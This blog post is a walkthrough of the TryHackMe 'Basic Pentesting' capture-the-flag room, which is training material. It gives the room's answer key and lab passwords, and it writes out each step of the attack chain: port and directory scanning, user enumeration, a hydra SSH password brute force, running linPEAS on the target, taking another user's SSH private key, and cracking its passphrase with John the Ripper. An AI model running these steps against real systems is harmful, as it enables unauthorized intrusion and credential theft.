---
layout: post
title: Basic Pentesting
categories: [CyberSecurity, CTF]
tags: [thm, easy, nmap, gobuster, enum4linux, hydra, linPEAS, JohnTheRipper]
---
![image info](./assets/basicpentesting.png){: .left }  

- [https://tryhackme.com/room/basicpentestingjt](https://tryhackme.com/room/basicpentestingjt)

## Task 1 Web App Testing and Privilege Escalation
In these set of tasks you'll learn the following:
 - brute forcing
 - hash cracking
 - service enumeration
 - Linux Enumeration

### Questions

Q1. What is the name of the hidden directory on the web server(enter name without /)?
```
development
```
Q2. What is the username?
```
jan
```
Q3. What is the password?
```
armando
```
Q4. What service do you use to access the server(answer in abbreviation in all caps)?
```
SSH
```
Q5. What is the name of the other user you found(all lower case)?
```
kay
```
Q6. What is the final password you obtain?
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

### MyWalk

Beginning with an nmap scan, and save the results on nmap/initial for future reference:

```bash
nmap -T4 -sC -sV -Pn -oN nmap/initial 10.10.40.46
```

Now I'll enumerate any directories available:

```bash
gobuster dir --url http://10.10.40.46 -w //usr/share/wordlists/dirb/common.txt | tee gobuster.txt
```
<span style="color:green;">Q1 done</span>

http://10.10.40.46/development give us 2 files referencing development messages between two users.

Lets use enum4linux:

```bash
/usr/share/enum4linux/enum4linux.pl -a 10.10.40.46 | tee enum4linux.log
```

Users 'kay' and 'jan' found.

<span style="color:green;">Q2 & Q5 done</span>

Now I try to get the 'jan' password using brute force, and get answer to Q3:

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.40.46 -t 4

```
jan:armando <span style="color:green;">Q3 done</span>

Now I'll try to login with shh credentials:
```bash
ssh jan@10.10.40.46
```
After sucessfull connection <span style="color:green;">Q4 done</span>. We will try some commands now:

```bash
jan@basic2:~$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Apr 23 2018 .
drwxr-xr-x 4 root root 4096 Apr 19 2018 ..
-rw------- 1 root jan 47 Apr 23 2018 .lesshst
jan@basic2:~$ pwd
/home/jan
jan@basic2:~$ cat .lesshst
cat: .lesshst: Permission denied
jan@basic2:~$ cat /etc/passd
cat: /etc/passd: No such file or directory
jan@basic2:~$ sudo -l
[sudo] password for jan:
Sorry, user jan may not run sudo on basic2.
jan@basic2:~$ cd ..
jan@basic2:/home$ cd kay
jan@basic2:/home/kay$ cat pass.bak
cat: pass.bak: Permission denied
jan@basic2:/home/kay$ cat .viminfo
cat: .viminfo: Permission denied
```
Nothing seems to work, so at this point we should try running Priviledge Escalation Awsome Script:

[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

After install the linpeas.sh script in our directory /opt/linPEAS we we'll run the command:

```bash
scp /opt/linPEAS/linpeas.sh jan@10.10.40.46:/dev/shm
```
Checking the target:

```bash
jan@basic2:~$ cd /dev/shm
jan@basic2:/dev/shm$ ls
linpeas.sh
```
Run it (on target):

```bash
./linpeas.sh | tee linlog.txt
```
Found a id_rsa key. Past it in a file using nano and mark it as read only by us.
Now lets connect with the key of 'kay' user:

```bash
sudo ssh -i kay_id_rsa kay@10.10.40.46
```
At this point an error occurred because the key format listed in the linpeas result was incorrect, so lets extract it directly from the directory: /home/kay/.ssh/id_rsa
After trying to connect again it asks for a paraphrase so we need to use johntheripper to find the pass.
First I need to prepare the key to use in johntheripper, with the ssh2john.py script, and save it in the forjohn.txt:

```bash
/usr/share/john/ssh2john.py kay_id_rsa > forjohn.txt
```

Now run john with the key against the rockyou.txt:

```bash
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
we can see the paraphrase is 'beeswax'
Lets try to login again as kay.

```bash
sudo ssh -i kay_id_rsa kay@10.10.40.46
```

Entering the paraphrase password 'beeswax' and success!  
Now is possible to read the pass.bak file and  
<span style="color:green;">Q6 done</span>

## Tools
- nmap
- gobuster
- enum4linux
- hydra
- linPEAS
- johntheripper